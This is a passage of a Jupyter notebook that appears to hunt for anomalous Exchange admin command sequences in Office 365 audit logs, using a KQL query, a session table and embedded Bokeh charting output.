       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>28</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-22 04:55:59+00:00</td>\n",
       "      <td>2020-06-22 04:55:59+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                        UserId  \\\n",
       "0  NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "1  NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "2  NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "3  NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "4  NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "\n",
       "  ClientIP  nCmds  nDistinctCmds                     begin  \\\n",
       "0      nan     28              1 2020-06-21 02:36:46+00:00   \n",
       "1      nan     28              1 2020-06-21 05:31:34+00:00   \n",
       "2      nan      2              1 2020-06-22 02:27:06+00:00   \n",
       "3      nan     26              1 2020-06-22 02:30:52+00:00   \n",
       "4      nan     28              1 2020-06-22 04:55:59+00:00   \n",
       "\n",
       "                        end duration  \\\n",
       "0 2020-06-21 02:36:46+00:00   0 days   \n",
       "1 2020-06-21 05:31:34+00:00   0 days   \n",
       "2 2020-06-22 02:27:06+00:00   0 days   \n",
       "3 2020-06-22 02:30:52+00:00   0 days   \n",
       "4 2020-06-22 04:55:59+00:00   0 days   \n",
       "\n",
       "                                                                                                  cmds  \n",
       "0  [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...  \n",
       "1  [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...  \n",
       "2                                           [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy]  \n",
       "3  [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...  \n",
       "4  [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...  "
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = \"\"\"\n",
    "| where TimeGenerated >= ago(60d)\n",
    "| where RecordType_s == 'ExchangeAdmin'\n",
    "| where UserId_s !startswith \"NT AUTHORITY\"\n",
    "| where UserId_s !contains \"prod.outlook.com\"  \n",
    "| extend params = todynamic(strcat('{\"', Operation_s, '\" : ', tostring(Parameters_s), '}')) \n",
    "| extend UserId = UserId_s, ClientIP = ClientIP_s, Operation = Operation_s\n",
    "| project TimeGenerated= Start_Time_t, UserId, ClientIP, Operation, params\n",
    "| sort by UserId asc, ClientIP asc, TimeGenerated asc\n",
    "| extend begin = row_window_session(TimeGenerated, 20m, 2m, UserId != prev(UserId) or ClientIP != prev(ClientIP))\n",
    "| summarize cmds=makelist(Operation), end=max(TimeGenerated), nCmds=count(), nDistinctCmds=dcount(Operation),\n",
    "params=makelist(params) by UserId, ClientIP, begin\n",
    "| project UserId, ClientIP, nCmds, nDistinctCmds, begin, end, duration=end-begin, cmds, params\n",
    "\"\"\"\n",
    "exchange_df = qry_prov.Azure.OfficeActivity(add_query_items=query)\n",
    "print(f\"Number of events {len(exchange_df)}\")\n",
    "exchange_df.drop(columns=\"params\").head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Perform Anomalous Sequence analysis on the data\n",
    "\n",
    "The analysis groups events into sessions (time-bounded and linked by a common account). It then<br>\n",
    "builds a probability model for the types of *command* (E.g. \"SetMailboxProperty\")<br>\n",
    "and the parameters and parameter values used for that command.\n",
    "\n",
    "I.e. how likely is it that a given user would be running this sequence of commands in a logon session?\n",
    "\n",
    "Using this probability model, we can highlight sequences that have an extremely low probability, based<br>\n",
    "on prior behaviour.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "gather": {
     "logged": 1617840741087
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1395\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"1395\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error(url) {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < css_urls.length; i++) {\n",
       "      const url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\": \"HjagQp6T0/7bxYTAXbLotF1MLAGWmhkY5siA1Gc/pcEgvgRPtMsRn0gQtMwGKiw1\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\": \"ZEPPTjL+mdyqgIq+/pl9KTwzji8Kow2NnI3zWY8+sFinWP/SYJ80BnfeJsa45iYj\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\": \"exLqv2ACDRIaV7ZK1iL8aGzGYQvKVuT3U2CT7FsQREBxRah6JrkVCoFy0koY1YqV\"};\n",
       "\n",
       "    for (let i = 0; i < js_urls.length; i++) {\n",
       "      const url = js_urls[i];\n",
       "      const element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"1395\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"1395\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\": \"HjagQp6T0/7bxYTAXbLotF1MLAGWmhkY5siA1Gc/pcEgvgRPtMsRn0gQtMwGKiw1\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\": \"ZEPPTjL+mdyqgIq+/pl9KTwzji8Kow2NnI3zWY8+sFinWP/SYJ80BnfeJsa45iYj\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\": \"exLqv2ACDRIaV7ZK1iL8aGzGYQvKVuT3U2CT7FsQREBxRah6JrkVCoFy0koY1YqV\"};\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"1395\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"cfa2deee-deba-4e70-9ee2-c878533bef28\" data-root-id=\"1467\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"cb6737e3-248a-45c9-aad1-4a03cb051470\":{\"defs\":[{\"extends\":null,\"module\":null,\"name\":\"DataModel\",\"overrides\":[],\"properties\":[]}],\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"1397\"},{\"id\":\"1437\"}]},\"id\":\"1467\",\"type\":\"Column\"},{\"attributes\":{},\"id\":\"1419\",\"type\":\"SaveTool\"},{\"attributes\":{\"overlay\":{\"id\":\"1421\"}},\"id\":\"1417\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"1418\",\"type\":\"ResetTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1420\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"1490\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"1491\",\"type\":\"Selection\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"syncable\":false,\"top_units\":\"screen\"},\"id\":\"1421\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"end\":1598583683100.0,\"start\":1591940482900.0},\"id\":\"1440\",\"type\":\"Range1d\"},{\"attributes\":{\"active_multi\":null,\"tools\":[{\"id\":\"1396\"},{\"id\":\"1416\"},{\"id\":\"1417\"},{\"id\":\"1418\"},{\"id\":\"1419\"},{\"id\":\"1420\"}]},\"id\":\"1422\",\"type\":\"Toolbar\"},{\"attributes\":{\"source\":{\"id\":\"1431\"}},\"id\":\"1436\",\"type\":\"CDSView\"},{\"attributes\":{\"align\":\"right\",\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\"},\"id\":\"1453\",\"type\":\"Title\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.7},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.7},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"begin\"},\"y\":{\"field\":\"rarest_window3_likelihood\"}},\"id\":\"1433\",\"type\":\"Circle\"},{\"attributes\":{\"below\":[{\"id\":\"1448\"},{\"id\":\"1453\"}],\"center\":[{\"id\":\"1451\"}],\"height\":120,\"renderers\":[{\"id\":\"1460\"}],\"title\":{\"id\":\"1438\"},\"toolbar\":{\"id\":\"1452\"},\"toolbar_location\":null,\"width\":900,\"x_range\":{\"id\":\"1440\"},\"x_scale\":{\"id\":\"1444\"},\"y_range\":{\"id\":\"1442\"},\"y_scale\":{\"id\":\"1446\"}},\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"1442\",\"type\":\"DataRange1d\"},{\"attributes\":{\"formatter\":{\"id\":\"1454\"},\"major_label_policy\":{\"id\":\"1476\"},\"ticker\":{\"id\":\"1449\"}},\"id\":\"1448\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"text\":\"Range Selector\"},\"id\":\"1438\",\"type\":\"Title\"},{\"attributes\":{\"data_source\":{\"id\":\"1431\"},\"glyph\":{\"id\":\"1433\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1434\"},\"view\":{\"id\":\"1436\"}},\"id\":\"1435\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1444\",\"type\":\"LinearScale\"},{\"attributes\":{\"data\":{\"ClientIP\":[\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"20.185.182.48:37965\"],\"UserId\":[\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator 